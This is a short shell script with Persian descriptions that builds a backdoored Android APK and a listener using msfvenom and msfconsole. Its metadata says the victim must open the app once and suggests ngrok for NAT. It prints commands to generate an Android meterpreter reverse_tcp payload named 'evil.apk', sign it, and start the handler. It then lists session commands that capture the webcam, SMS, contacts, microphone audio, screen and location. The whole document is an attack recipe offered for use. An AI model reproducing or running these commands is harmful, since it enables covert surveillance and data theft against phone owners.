DESC="ساخت APK بکدور و شنونده (بدون تعامل با هدف نصب می‌شود)"
REQ="msfvenom + msfconsole + IP عمومی"
RISK="HIGH"
NOTE="بعد از نصب باید اپ را یک‌بار باز کنند. برای NAT از ngrok استفاده کن"

termux(){
cat <<'EOF'
pkg install unstable-repo && pkg install metasploit
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o evil.apk
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
EOF
}

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -o evil.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -o evil_signed.apk \
  --arch dalvik

# امضا (اگر رد شد)
keytool -genkey -keystore k.jks -alias a -keyalg RSA -keysize 2048 -validity 10000 -storepass pass -keypass pass -dname "CN=a"
apksigner sign --ks k.jks --ks-pass pass:pass evil_signed.apk

# شنونده
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"

# داخل session:
#   webcam_snap -i 1
#   dump_contacts
#   dump_sms
#   record_mic -d 20
#   screenshare
#   geolocate
EOF
}
